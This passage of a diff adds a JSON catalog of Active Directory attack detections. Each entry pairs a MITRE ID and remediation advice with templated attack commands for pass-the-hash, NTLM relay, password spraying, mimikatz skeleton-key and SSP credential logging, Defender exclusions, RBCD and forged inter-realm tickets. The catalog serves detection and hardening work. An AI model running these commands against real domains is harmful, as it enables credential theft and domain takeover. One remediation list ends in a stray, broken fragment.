+      "evil-winrm -i {dc} -u {user} -p {pass}",
+      "evil-winrm -i {dc} -u {user} -H {ntlm_hash}"
+    ],
+    "remediation": [
+      "Restrict WinRM access via firewall (only from management hosts)",
+      "Enable WinRM HTTPS only (port 5986)",
+      "Monitor Event ID 4624 LogonType=3 from unexpected sources"
+    ]
+  },
+  {
+    "category": "LATERAL MOVEMENT",
+    "id": "lateral-dcom-001",
+    "title": "DCOM Remote Execution \u2014 MMC20 Application Object Abuse",
+    "severity": "HIGH",
+    "mitre": "T1021.003",
+    "description": "Detects DCOM-based lateral movement via MMC20.Application, ShellWindows, ShellBrowserWindow, or ExcelDDE. Leaves minimal artifacts \u2014 no service creation or WMI events.",
+    "commands": [
+      "impacket-dcomexec {dom}/{user}:{pass}@{dc} 'whoami'"
+    ],
+    "all_commands": [
+      "impacket-dcomexec {dom}/{user}:{pass}@{dc} 'whoami'"
+    ],
+    "remediation": [
+      "Restrict DCOM permissions via DCOMCNFG",
+      "Block outbound RPC (135, 49152-65535) between workstations"
+    ]
+  },
+  {
+    "category": "LATERAL MOVEMENT",
+    "id": "lateral-pth-001",
+    "title": "Pass-the-Hash \u2014 NTLM Authentication with Stolen Hash",
+    "severity": "CRITICAL",
+    "mitre": "T1550.002",
+    "description": "Detects Pass-the-Hash attacks where NTLM hash is used instead of password for authentication. Pattern: NewCredentials logon (type 9) followed by network authentication, or CrackMapExec -H flag usage.",
+    "commands": [
+      "crackmapexec smb {dc} -u {user} -H {ntlm} -d {dom} -x 'whoami'",
+      "impacket-psexec {dom}/{user}@{dc} -hashes :{ntlm}",
+      "mimikatz sekurlsa::pth /user:{user} /domain:{dom} /ntlm:{hash} /run:powershell.exe",
+      "evil-winrm -i {dc} -u {user} -H {ntlm}"
+    ],
+    "all_commands": [
+      "crackmapexec smb {dc} -u {user} -H {ntlm} -d {dom} -x 'whoami'",
+      "impacket-psexec {dom}/{user}@{dc} -hashes :{ntlm}",
+      "mimikatz sekurlsa::pth /user:{user} /domain:{dom} /ntlm:{hash} /run:powershell.exe",
+      "evil-winrm -i {dc} -u {user} -H {ntlm}"
+    ],
+    "remediation": [
+      "Enforce Protected Users group for privileged accounts (blocks NTLM)",
+      "Disable NTLM authentication where possible (use Kerberos)",
+      "Enable Network access: Restrict NTLM (Group Policy)"
+    ]
+  },
+  {
+    "category": "LATERAL MOVEMENT",
+    "id": "lateral-winrs-001",
+    "title": "WinRS Lateral Movement \u2014 Low-Footprint Remote Shell",
+    "severity": "HIGH",
+    "mitre": "T1021.006",
+    "description": "WinRS (winrshost.exe) provides remote shell via WinRM without creating PowerShell process. Lower detection profile than Evil-WinRM. Used in CRTP curriculum for stealthy lateral movement.",
+    "commands": [
+      "winrs -r:{target} -u:{dom}\\\\{user} -p:{pass} cmd.exe",
+      "winrs -r:{target} -u:{dom}\\\\{user} -p:{pass} 'whoami /all'"
+    ],
+    "all_commands": [
+      "winrs -r:{target} -u:{dom}\\\\{user} -p:{pass} cmd.exe",
+      "winrs -r:{target} -u:{dom}\\\\{user} -p:{pass} 'whoami /all'"
+    ],
+    "remediation": [
+      "Monitor winrshost.exe process creation events",
+      "Restrict WinRM access to management jump servers only",
+      "Audit Event ID 91 (WinRM session start)"
+    ]
+  },
+  {
+    "category": "LATERAL MOVEMENT",
+    "id": "lateral-atexec-001",
+    "title": "AtExec \u2014 Scheduled Task Remote Execution",
+    "severity": "HIGH",
+    "mitre": "T1053.005",
+    "description": "impacket-atexec creates a remote scheduled task, executes command, retrieves output, then deletes the task. Leaves Event ID 4698 (task creation) and 4699 (task deletion) within seconds.",
+    "commands": [
+      "impacket-atexec {dom}/{user}:{pass}@{dc} '{command}'"
+    ],
+    "all_commands": [
+      "impacket-atexec {dom}/{user}:{pass}@{dc} '{command}'"
+    ],
+    "remediation": [
+      "Monitor Event IDs 4698/4699 pairs with short intervals",
+      "Audit scheduled task creation by non-administrative accounts",
+      "Restrict Task Scheduler remote access"
+    ]
+  },
+  {
+    "category": "LATERAL MOVEMENT",
+    "id": "lateral-rdp-pth-001",
+    "title": "RDP Access with Pass-the-Hash via xfreerdp",
+    "severity": "HIGH",
+    "mitre": "T1021.001",
+    "description": "Detects RDP Pass-the-Hash using xfreerdp /pth flag or enabling RDP via CrackMapExec rdp module followed by restricted admin mode connection.",
+    "commands": [
+      "crackmapexec smb {dc} -u {user} -p {pass} -M rdp -o ACTION=enable",
+      "xfreerdp /u:{user} /pth:{ntlm} /v:{dc}"
+    ],
+    "all_commands": [
+      "crackmapexec smb {dc} -u {user} -p {pass} -M rdp -o ACTION=enable",
+      "xfreerdp /u:{user} /pth:{ntlm} /v:{dc}"
+    ],
+    "remediation": [
+      "Enable Network Level Authentication (NLA)",
+      "Disable Restricted Admin Mode",
+      "Monitor RDP connections via NTLM authentication"
+    ]
+  },
+  {
+    "category": "PASSWORD ATTACKS",
+    "id": "password-spray-001",
+    "title": "Password Spraying \u2014 Distributed Authentication Failures",
+    "severity": "HIGH",
+    "mitre": "T1110.003",
+    "description": "Password spraying uses single password against many accounts to avoid lockout. Detection pattern: many 4625 failures from same source IP, each for different username, within short timeframe.",
+    "commands": [
+      "crackmapexec smb {dc} -u '{user_file}' -p '{spray_pass}' -d {dom} --continue-on-success --jitter 30",
+      "crackmapexec ldap {dc} -u '{user_file}' -p '{spray_pass}' -d {dom} --continue-on-success",
+      "Rubeus.exe brute /users:{file} /passwords:{file} /domain:{dom} /outfile:valid.txt",
+      "kerbrute passwordspray -d {dom} --dc {dc} {user_file} '{pass}'"
+    ],
+    "all_commands": [
+      "crackmapexec smb {dc} -u '{user_file}' -p '{spray_pass}' -d {dom} --continue-on-success --jitter 30",
+      "crackmapexec ldap {dc} -u '{user_file}' -p '{spray_pass}' -d {dom} --continue-on-success",
+      "Rubeus.exe brute /users:{file} /passwords:{file} /domain:{dom} /outfile:valid.txt",
+      "kerbrute passwordspray -d {dom} --dc {dc} {user_file} '{pass}'"
+    ],
+    "remediation": [
+      "Implement account lockout policy (lockout after 5-10 failures, 30 min lockout)",
+      "Deploy fine-grained password policy for privileged accounts",
+      "Monitor for low-and-slow spray patterns"
+    ]
+  },
+  {
+    "category": "PASSWORD ATTACKS",
+    "id": "password-kerbrute-enum-001",
+    "title": "Kerbrute Username Enumeration via Kerberos Pre-Auth",
+    "severity": "MEDIUM",
+    "mitre": "T1589.001",
+    "description": "Kerbrute enumerates valid usernames using Kerberos AS-REQ pre-auth errors. Valid users return different error code than invalid users, allowing enumeration without authentication. Doesn't trigger lockouts.",
+    "commands": [
+      "kerbrute userenum -d {dom} --dc {dc} {user_file}",
+      "kerbrute passwordspray -d {dom} --dc {dc} {user_file} '{pass}'"
+    ],
+    "all_commands": [
+      "kerbrute userenum -d {dom} --dc {dc} {user_file}",
+      "kerbrute passwordspray -d {dom} --dc {dc} {user_file} '{pass}'"
+    ],
+    "remediation": [
+      "Rate limit Kerberos AS-REQ from single source",
+      "Monitor bulk 4768 errors (ResultCode=0x6) from same IP",
+      "Use honeypot accounts that alert on any auth attempt"
+    ]
+  },
+  {
+    "category": "PASSWORD ATTACKS",
+    "id": "password-ntlm-relay-001",
+    "title": "NTLM Relay via Responder \u2014 SMB Signing Bypass",
+    "severity": "CRITICAL",
+    "mitre": "T1557",
+    "description": "NTLM relay captures authentication from poisoned LLMNR/NBT-NS and relays it to target systems without SMB signing. Enables code execution or AD object modification without knowing the password.",
+    "commands": [
+      "impacket-ntlmrelayx -tf {targets_file} -smb2support -c 'whoami' --output-file relay.txt"
+    ],
+    "all_commands": [
+      "sudo responder -I eth0 -rdw",
+      "impacket-ntlmrelayx -tf {targets_file} -smb2support -c 'whoami' --output-file relay.txt"
+    ],
+    "remediation": [
+      "Enable SMB Signing (required) on all systems",
+      "Disable NTLM authentication (use Kerberos)",
+      "Disable LLMNR and NBT-NS (prevents poisoning)"
+    ]
+  },
+  {
+    "category": "PASSWORD ATTACKS",
+    "id": "password-credential-stuffing-001",
+    "title": "Credential Stuffing \u2014 Breached Credential List Against AD",
+    "severity": "HIGH",
+    "mitre": "T1110.004",
+    "description": "Testing breached username:password pairs against Active Directory. Pattern similar to password spraying but with matched pairs \u2014 each account tested with its previously-breached password.",
+    "commands": [
+      "crackmapexec smb {dc} -d {dom} --continue-on-success --no-bruteforce -u {creds_file} -p {creds_file}"
+    ],
+    "all_commands": [
+      "crackmapexec smb {dc} -d {dom} --continue-on-success --no-bruteforce -u {creds_file} -p {creds_file}"
+    ],
+    "remediation": [
+      "Compare AD user passwords against HaveIBeenPwned database",
+      "Enable Microsoft Entra Password Protection (leaked password detection)",
+      "Implement MFA as defense against credential stuffing"
+    ]
+  },
+  {
+    "category": "PASSWORD ATTACKS",
+    "id": "password-default-creds-001",
+    "title": "Default Credential Testing \u2014 Common Service Account Passwords",
+    "severity": "HIGH",
+    "mitre": "T1078.001",
+    "description": "Testing default credentials for common service accounts (admin/admin, administrator/password123, sa/sa, etc.) against SMB and other services.",
+    "commands": [
+      "crackmapexec smb {dc} -u '{user}' -p '{default_pass}' -d {dom}"
+    ],
+    "all_commands": [
+      "crackmapexec smb {dc} -u '{user}' -p '{default_pass}' -d {dom}"
+    ],
+    "remediation": [
+      "Disable default accounts (Guest, local Administrator)",
+      "Rename default administrator account",
+      "Enforce complex passwords during account creation"
+    ]
+  },
+  {
+    "category": "PERSISTENCE",
+    "id": "persist-adminsdholder-001",
+    "title": "AdminSDHolder ACL Modification \u2014 Persistent Privileged Access",
+    "severity": "CRITICAL",
+    "mitre": "T1098",
+    "description": "AdminSDHolder is a template object whose DACL is propagated to all protected groups every 60 minutes by SDPropagator. Adding a backdoor ACE to AdminSDHolder grants persistent access that survives direct group membership removal.",
+    "commands": [
+      "Set-DomainObjectAcl -TargetIdentity 'AdminSDHolder' -PrincipalIdentity {user} -Rights All",
+      "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,...' -PrincipalIdentity {user} -Rights DCSync"
+    ],
+    "all_commands": [
+      "Set-DomainObjectAcl -TargetIdentity 'AdminSDHolder' -PrincipalIdentity {user} -Rights All",
+      "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,...' -PrincipalIdentity {user} -Rights DCSync"
+    ],
+    "remediation": [
+      "Monitor Event 5136 on AdminSDHolder object",
+      "Review AdminSDHolder DACL quarterly",
+      "Alert on manual SDPropagator execution (Invoke-SDPropagator command)"
+    ]
+  },
+  {
+    "category": "PERSISTENCE",
+    "id": "persist-dsrm-001",
+    "title": "DSRM Account Backdoor \u2014 Remote DC Login via Directory Services Restore Mode",
+    "severity": "CRITICAL",
+    "mitre": "T1078.002",
+    "description": "DSRM (Directory Services Restore Mode) account is a local administrator on every DC. By setting DSRMAdminLogonBehavior=2, DSRM account can be used for remote network authentication \u2014 persistent DC backdoor.",
+    "commands": [
+      "Set-DomainAccountPassword -Identity 'Administrator' -AccountPassword (ConvertTo-SecureString '{pass}' -AsPlainText -Force) -domain {dc_hostname}"
+    ],
+    "all_commands": [
+      "New-ItemProperty 'HKLM:\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\' -Name 'DSRMAdminLogonBehavior' -Value 2",
+      "Set-DomainAccountPassword -Identity 'Administrator' -AccountPassword (ConvertTo-SecureString '{pass}' -AsPlainText -Force) -domain {dc_hostname}"
+    ],
+    "remediation": [
+      "Remove or reset DSRMAdminLogonBehavior to 0",
+      "Regularly rotate DSRM password (at least annually)",
+      "Monitor registry key DSRMAdminLogonBehavior for value changes"
+    ]
+  },
+  {
+    "category": "PERSISTENCE",
+    "id": "persist-skeleton-key-001",
+    "title": "Skeleton Key \u2014 Mimikatz LSASS Patch for Master Password",
+    "severity": "CRITICAL",
+    "mitre": "T1556.001",
+    "description": "Skeleton Key patches LSASS on the DC to accept any password (\"skeleton key\") for any domain account in addition to the real password. Non-persistent \u2014 cleared on DC reboot. Requires DA privileges.",
+    "commands": [
+      "mimikatz misc::skeleton"
+    ],
+    "all_commands": [
+      "mimikatz misc::skeleton",
+      "Invoke-Mimi -Command '\\\"misc::skeleton\\\"'"
+    ],
+    "remediation": [
+      "Deploy Credential Guard (prevents LSASS patching)",
+      "Monitor Event ID 4611 (Trusted Logon Process) on DCs",
+      "Alert on LSASS memory writes from non-system processes on DCs"
+    ]
+  },
+  {
+    "category": "PERSISTENCE",
+    "id": "persist-custom-ssp-001",
+    "title": "Custom SSP Installation \u2014 mimilib Credential Logger",
+    "severity": "CRITICAL",
+    "mitre": "T1547.005",
+    "description": "Installing mimilib.dll as Security Support Provider (SSP) causes Windows to log all authentication credentials to C:\\Windows\\System32\\kiwissp.log. Survives reboots as DLL registered in LSA Security Packages registry key.",
+    "commands": [
+      "mimikatz misc::memssp  # In-memory SSP (no disk write)"
+    ],
+    "all_commands": [
+      "mimikatz misc::memssp  # In-memory SSP (no disk write)",
+      "Add-MpPreference -ExclusionPath C:\\\\Windows\\\\System32",
+      "reg add 'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa' /v 'Security Packages' /d 'mimilib'"
+    ],
+    "remediation": [
+      "Monitor registry key \"Security Packages\" for unauthorized DLL additions",
+      "Monitor for kiwissp.log creation in System32",
+      "Use Windows Defender ASR rule \"Block credential stealing from LSASS"
+    ]
+  },
+  {
+    "category": "PERSISTENCE",
+    "id": "persist-sid-history-001",
+    "title": "SID History Injection \u2014 Hidden Domain Admin Privileges",
+    "severity": "CRITICAL",
+    "mitre": "T1134.005",
+    "description": "SID History stores SIDs from previous domain migrations. Injecting DA SID into regular user's SID History grants DA-level access without group membership \u2014 bypasses membership-based monitoring.",
+    "commands": [
+      "mimikatz lsadump::sid /sam:{user} /new:{SID}",
+      "Set-DomainObject -Identity {user} -Set @{sIDHistory='{DA-SID}'}"
+    ],
+    "all_commands": [
+      "mimikatz lsadump::sid /sam:{user} /new:{SID}",
+      "Set-DomainObject -Identity {user} -Set @{sIDHistory='{DA-SID}'}"
+    ],
+    "remediation": [
+      "Enable SID filtering on all domain trusts",
+      "Monitor Event 4765/4766 for unexpected SID History additions",
+      "Audit users with sIDHistory set to privileged SIDs"
+    ]
+  },
+  {
+    "category": "PERSISTENCE",
+    "id": "persist-wmi-subscription-001",
+    "title": "WMI Event Subscription \u2014 Fileless Persistence",
+    "severity": "HIGH",
+    "mitre": "T1546.003",
+    "description": "WMI event subscriptions (EventFilter + EventConsumer + FilterToConsumerBinding) provide fileless persistence triggered by system events. CommandLineEventConsumer executes arbitrary commands. Very stealthy \u2014 no scheduled task or registry Run key.",
+    "commands": [
+      "Register-WMIEvent -Query 'SELECT * FROM __InstanceModificationEvent...' -Action {Start-Process powershell.exe}"
+    ],
+    "all_commands": [
+      "Register-WMIEvent -Query 'SELECT * FROM __InstanceModificationEvent...' -Action {Start-Process powershell.exe}",
+      "New-WMISubscription -Name backdoor -Query '...' -Command 'powershell.exe'"
+    ],
+    "remediation": [
+      "Enable Sysmon WMI subscription logging (Event IDs 19, 20, 21)",
+      "Monitor WmiPrvSE.exe child processes",
+      "Audit existing WMI subscriptions: Get-WmiObject -Namespace root/subscription -Class __EventFilter"
+    ]
+  },
+  {
+    "category": "PERSISTENCE",
+    "id": "persist-registry-runkey-001",
+    "title": "Registry Run Key \u2014 Local Persistence",
+    "severity": "HIGH",
+    "mitre": "T1547.001",
+    "description": "Adds executable to HKCU or HKLM Run registry keys for execution at logon/startup. Classic local persistence mechanism.",
+    "commands": [],
+    "all_commands": [
+      "New-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name 'Updater' -Value 'C:\\\\payload.exe'",
+      "reg add 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' /v Updater /d C:\\\\payload.exe"
+    ],
+    "remediation": [
+      "Monitor registry Run key modifications (Event 4657)",
+      "Enable Autoruns monitoring and alerting",
+      "Restrict HKLM Run key writes to SYSTEM/Administrators"
+    ]
+  },
+  {
+    "category": "PERSISTENCE",
+    "id": "persist-network-provider-001",
+    "title": "Custom Network Provider \u2014 NPPSPY Credential Capture on Logon",
+    "severity": "CRITICAL",
+    "mitre": "T1556",
+    "description": "NPPSPY registers a malicious DLL as a Network Provider that receives all plaintext credentials during Windows logon. Survives reboots. Credentials written to C:\\NPPSpy.txt or similar.",
+    "commands": [],
+    "all_commands": [
+      "Install-NetworkProvider -DllPath C:\\\\NPPSpy.dll",
+      "reg add 'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\NPPSpy' /v 'NetworkProvider' ..."
+    ],
+    "remediation": [
+      "Monitor NetworkProvider registry key modifications",
+      "Audit registered Network Providers on all systems",
+      "Implement allowlisting for approved Network Provider DLLs"
+    ]
+  },
+  {
+    "category": "PERSISTENCE",
+    "id": "persist-delegation-backdoor-001",
+    "title": "Persistent Constrained Delegation \u2014 msDS-AllowedToDelegateTo Modification",
+    "severity": "CRITICAL",
+    "mitre": "T1098",
+    "description": "Attacker with GenericWrite/WriteDACL sets msDS-AllowedToDelegateTo on a controlled account to allow impersonation to sensitive services. Provides persistent impersonation path that survives password resets.",
+    "commands": [],
+    "all_commands": [],
+    "remediation": [
+      "Alert on any msDS-AllowedToDelegateTo modification (Event 5136)",
+      "Audit delegation attributes quarterly",
+      "Enable \"Account is sensitive and cannot be delegated\" for DA accounts"
+    ]
+  },
+  {
+    "category": "RBCD ATTACKS",
+    "id": "rbcd-full-chain-001",
+    "title": "RBCD Full Chain \u2014 MachineAccountQuota to Computer Account Compromise",
+    "severity": "CRITICAL",
+    "mitre": "T1134.001",
+    "description": "Full RBCD attack: (1) Create fake computer via MAQ, (2) Write fake computer SID to target's msDS-AllowedToActOnBehalfOfOtherIdentity, (3) Use S4U2Self to impersonate DA to target service, (4) Use S4U2Proxy to get service ticket. Results in full control of target computer as Administrator.",
+    "commands": [
+      "impacket-addcomputer -computer-name '{comp}$' -computer-pass '{pass}' {dom}/{user}:{pass} -dc-ip {dc}",
+      "impacket-rbcd -f {comp} -t {victim} {dom}/{user}:{pass}",
+      "impacket-getST -spn cifs/{victim}.{dom} -impersonate Administrator {dom}/{comp}$:{comp_pass} -dc-ip {dc}",
+      "impacket-psexec {dom}/Administrator@{victim} -k -no-pass"
+    ],
+    "all_commands": [
+      "impacket-addcomputer -computer-name '{comp}$' -computer-pass '{pass}' {dom}/{user}:{pass} -dc-ip {dc}",
+      "impacket-rbcd -f {comp} -t {victim} {dom}/{user}:{pass}",
+      "impacket-getST -spn cifs/{victim}.{dom} -impersonate Administrator {dom}/{comp}$:{comp_pass} -dc-ip {dc}",
+      "impacket-psexec {dom}/Administrator@{victim} -k -no-pass"
+    ],
+    "remediation": [
+      "Set MachineAccountQuota to 0 (Critical \u2014 prevents all MAQ-based RBCD)",
+      "Alert on msDS-AllowedToActOnBehalfOfOtherIdentity modifications (Event 5136)",
+      "Monitor for sequence: 4741 \u2192 5136 within short timeframe"
+    ]
+  },
+  {
+    "category": "RBCD ATTACKS",
+    "id": "rbcd-ntlm-relay-001",
+    "title": "RBCD via NTLM Relay \u2014 --delegate-access Flag",
+    "severity": "CRITICAL",
+    "mitre": "T1557",
+    "description": "impacket-ntlmrelayx --delegate-access automatically performs RBCD attack during relay: creates computer account and sets RBCD on victim computer in single operation. Most automated RBCD attack path.",
+    "commands": [
+      "impacket-ntlmrelayx -t ldap://{dc} -smb2support --delegate-access"
+    ],
+    "all_commands": [
+      "impacket-ntlmrelayx -t ldap://{dc} -smb2support --delegate-access"
+    ],
+    "remediation": [
+      "Enable LDAP signing (prevents relay to LDAP)",
+      "Enable SMB signing on all hosts",
+      "Set MachineAccountQuota to 0"
+    ]
+  },
+  {
+    "category": "RBCD ATTACKS",
+    "id": "rbcd-bronze-bit-001",
+    "title": "Bronze Bit \u2014 CVE-2020-17049 Constrained Delegation Bypass",
+    "severity": "CRITICAL",
+    "mitre": "T1134.001",
+    "description": "CVE-2020-17049 (Bronze Bit) bypasses the constrained delegation restriction on forwarding non-forwardable service tickets. Allows S4U2Proxy with tickets that should not be forwardable. Patched in November 2020.",
+    "commands": [
+      "impacket-getST -spn cifs/{target} -impersonate Administrator -force-forwardable {dom}/{svc}:{pass}",
+      "Rubeus.exe s4u /bronzebit /impersonateuser:Admin /msdsspn:cifs/{target} /ptt"
+    ],
+    "all_commands": [
+      "impacket-getST -spn cifs/{target} -impersonate Administrator -force-forwardable {dom}/{svc}:{pass}",
+      "Rubeus.exe s4u /bronzebit /impersonateuser:Admin /msdsspn:cifs/{target} /ptt"
+    ],
+    "remediation": [
+      "Apply November 2020 Kerberos security updates (KB4586786)",
+      "Monitor S4U2Proxy requests with non-forwardable tickets"
+    ]
+  },
+  {
+    "category": "RBCD ATTACKS",
+    "id": "rbcd-s4u2self-001",
+    "title": "S4U2Self \u2014 Service Account Impersonation via Protocol Transition",
+    "severity": "HIGH",
+    "mitre": "T1134.001",
+    "description": "S4U2Self (Protocol Transition) allows a service account with trusted for delegation to request a service ticket to itself on behalf of any user. Used as first step before S4U2Proxy or standalone for token impersonation.",
+    "commands": [],
+    "all_commands": [],
+    "remediation": [
+      "Enable \"Account is sensitive and cannot be delegated\" for DA accounts",
+      "Monitor S4U2Self requests for privileged accounts"
+    ]
+  },
+  {
+    "category": "RBCD ATTACKS",
+    "id": "rbcd-cleanup-001",
+    "title": "RBCD Cleanup \u2014 Attacker Removes Evidence (msDS-AllowedToActOnBehalfOfOtherIdentity)",
+    "severity": "HIGH",
+    "mitre": "T1070",
+    "description": "After RBCD attack, attacker cleans up by removing msDS-AllowedToActOnBehalfOfOtherIdentity and deleting fake computer account. Removal of these indicators is itself suspicious.",
+    "commands": [],
+    "all_commands": [],
+    "remediation": [
+      "Alert on BOTH setting AND removal of delegation attributes",
+      "Retain AD change history in SIEM for 90+ days"
+    ]
+  },
+  {
+    "category": "RBCD ATTACKS",
+    "id": "rbcd-powermad-001",
+    "title": "Powermad \u2014 New-MachineAccount Computer Creation via LDAP",
+    "severity": "HIGH",
+    "mitre": "T1136.002",
+    "description": "Powermad.ps1 New-MachineAccount creates computer accounts via direct LDAP without needing local admin or Active Directory Users and Computers. Exploits MachineAccountQuota default of 10.",
+    "commands": [
+      "Import-Module .\\\\Powermad.ps1; New-MachineAccount -MachineAccount {comp} -Password (ConvertTo-SecureString '{pass}' -AsPlainText -Force)"
+    ],
+    "all_commands": [
+      "Import-Module .\\\\Powermad.ps1; New-MachineAccount -MachineAccount {comp} -Password (ConvertTo-SecureString '{pass}' -AsPlainText -Force)"
+    ],
+    "remediation": [
+      "Set MachineAccountQuota = 0 (elimnates Powermad attack path)",
+      "Monitor for New-MachineAccount PowerShell execution",
+      "sast_code_analysis:"
+    ]
+  },
+  {
+    "category": "TRUST ATTACKS",
+    "id": "trust-cross-forest-kerberoast-001",
+    "title": "Cross-Forest Kerberoasting \u2014 Foreign Domain SPN Enumeration",
+    "severity": "HIGH",
+    "mitre": "T1558.003",
+    "description": "Kerberoasting targeting service accounts in foreign trusted domains. Requires authentication in source domain, requests TGS for foreign domain SPNs using inter-realm ticket referral chain.",
+    "commands": [
+      "impacket-GetUserSPNs -target-domain {trusted} {dom}/{user}:{pass} -dc-ip {dc} -request -outputfile cross_spns.txt"
+    ],
+    "all_commands": [
+      "impacket-GetUserSPNs -target-domain {trusted} {dom}/{user}:{pass} -dc-ip {dc} -request -outputfile cross_spns.txt"
+    ],
+    "remediation": [
+      "Enable SID Filtering on all forest trusts",
+      "Restrict service accounts in trusted domains to strong passwords/gMSA",
+      "Monitor cross-realm TGS requests with RC4 encryption"
+    ]
+  },
+  {
+    "category": "TRUST ATTACKS",
+    "id": "trust-extrasid-001",
+    "title": "ExtraSID Attack \u2014 Inter-Realm Golden Ticket with Parent Domain SID",
+    "severity": "CRITICAL",
+    "mitre": "T1558.001",
+    "description": "ExtraSID injects parent/target domain's Enterprise Admin SID (S-1-5-21-*-519) into the inter-realm TGT. When used against parent domain, grants EA-level access without legitimate credentials in that domain.",
+    "commands": [
+      "impacket-ticketer -nthash {krbtgt_h} -domain-sid {dom_sid} -domain {dom} -extra-sid {target_sid}-519 -user-id 500 Administrator",
+      "impacket-psexec {parent_dom}/Administrator@{parent_dc} -k -no-pass"
+    ],
+    "all_commands": [
+      "impacket-ticketer -nthash {krbtgt_h} -domain-sid {dom_sid} -domain {dom} -extra-sid {target_sid}-519 -user-id 500 Administrator",
+      "export KRB5CCNAME=Administrator.ccache",
+      "impacket-psexec {parent_dom}/Administrator@{parent_dc} -k -no-pass"
+    ],
+    "remediation": [
+      "Enable SID Filtering on ALL trust relationships (breaks SID History migration \u2014 plan accordingly)",
+      "Monitor inter-realm ticket requests with anomalous PAC content",
+      "Deploy Microsoft Defender for Identity golden/inter-realm ticket detection"
+    ]
+  },
+  {
+    "category": "TRUST ATTACKS",
+    "id": "trust-key-extraction-001",
+    "title": "Trust Key Extraction \u2014 lsadump::trust for Cross-Forest Silver Ticket",
+    "severity": "CRITICAL",
+    "mitre": "T1003.003",
+    "description": "Trust keys (Inter-Realm trust account hash) are stored in LSASS on DCs. Extraction via lsadump::trust or secretsdump enables forging of inter-realm tickets for cross-forest access.",
+    "commands": [
+      "impacket-secretsdump {dom}/{user}:{pass}@{dc} -just-dc-ntlm | grep -i trust",
+      "mimikatz lsadump::trust /patch"
+    ],
+    "all_commands": [
+      "impacket-secretsdump {dom}/{user}:{pass}@{dc} -just-dc-ntlm | grep -i trust",
+      "mimikatz lsadump::trust /patch",
+      "Invoke-Mimi -Command '\\\"lsadump::trust /patch\\\"'"
+    ],
+    "remediation": [
+      "Reset trust account passwords (netdom resetpwd)",
+      "Monitor trust account hash access on DCs",
+      "Enable auditing on trust-related LDAP attributes"
+    ]
+  },
+  {
+    "category": "TRUST ATTACKS",
+    "id": "trust-pam-001",
+    "title": "PAM Trust Abuse \u2014 Shadow Principals in Privileged Access Management",
+    "severity": "CRITICAL",
+    "mitre": "T1484.002",
+    "description": "PAM (Privileged Access Management) trust allows bastion forest security groups to have time-limited shadow memberships in production forest groups. Abuse: attacker compromises bastion forest and abuses shadow principal mappings.",
+    "commands": [],
+    "all_commands": [],
+    "remediation": [
+      "Treat bastion forest with same security as production forest",
+      "Review shadow principal mappings regularly",
+      "Monitor cross-forest auth events from bastion accounts"
+    ]
+  },
+  {
+    "category": "TRUST ATTACKS",
+    "id": "trust-enumeration-001",
+    "title": "Domain Trust Enumeration via LDAP",
+    "severity": "MEDIUM",
+    "mitre": "T1087.002",
+    "description": "Detects LDAP enumeration of domain trust relationships via trustedDomain object class queries. Provides attack map of connected forests.",
+    "commands": [
+      "ldapsearch -b '{base_dn}' '(objectClass=trustedDomain)' trustDirection trustPartner",
+      "impacket-findDelegation {dom}/{user}:{pass}"
+    ],
+    "all_commands": [
+      "ldapsearch -b '{base_dn}' '(objectClass=trustedDomain)' trustDirection trustPartner",
+      "nltest /domain_trusts",
+      "Get-DomainTrust",
+      "impacket-findDelegation {dom}/{user}:{pass}"
+    ],
+    "remediation": [
+      "Monitor bulk LDAP reads on trustedDomain objects",
+      "Implement AD canary objects in trust enumeration paths"
+    ]
+  },
+  {
+    "category": "TRUST ATTACKS",
+    "id": "trust-foreign-group-001",
+    "title": "Foreign Security Principal \u2014 Cross-Domain Group Membership Enumeration",
+    "severity": "MEDIUM",
+    "mitre": "T1087.002",
+    "description": "Foreign Security Principals (FSPs) represent accounts from trusted domains that are members of local groups. Enumeration identifies potential escalation paths via group membership in target domain.",
+    "commands": [
+      "ldapsearch -b '{target_dn}' '(member=*)' cn member"
+    ],
+    "all_commands": [
+      "Get-DomainForeignGroupMember",
+      "ldapsearch -b '{target_dn}' '(member=*)' cn member",
+      "Get-DomainForeignUser"
+    ],
+    "remediation": [
+      "Audit foreign security principals in sensitive groups",
+      "Remove unnecessary cross-domain group memberships"
+    ]
+  },
+  {
+    "category": "TRUST ATTACKS",
+    "id": "trust-child-parent-001",
+    "title": "Child-to-Parent Domain Escalation via SID History Injection",
+    "severity": "CRITICAL",
+    "mitre": "T1134.005",
+    "description": "Compromising child domain krbtgt allows forging inter-realm TGT with parent domain Enterprise Admin SID injected via SID history mechanism. Effectively grants EA in parent domain from child domain compromise.",
+    "commands": [
+      "impacket-ticketer -nthash {child_krbtgt} -domain-sid {child_sid} -domain {child_dom} -extra-sid {parent_sid}-519 Administrator"
+    ],
+    "all_commands": [
+      "impacket-ticketer -nthash {child_krbtgt} -domain-sid {child_sid} -domain {child_dom} -extra-sid {parent_sid}-519 Administrator"
+    ],
+    "remediation": [
+      "Enable SID Filtering between parent and child domains",
+      "Alert when -519 (EA) SID appears in tickets from child domain users",
+      "Treat child domain compromise as parent domain compromise"
+    ]
+  }
+]
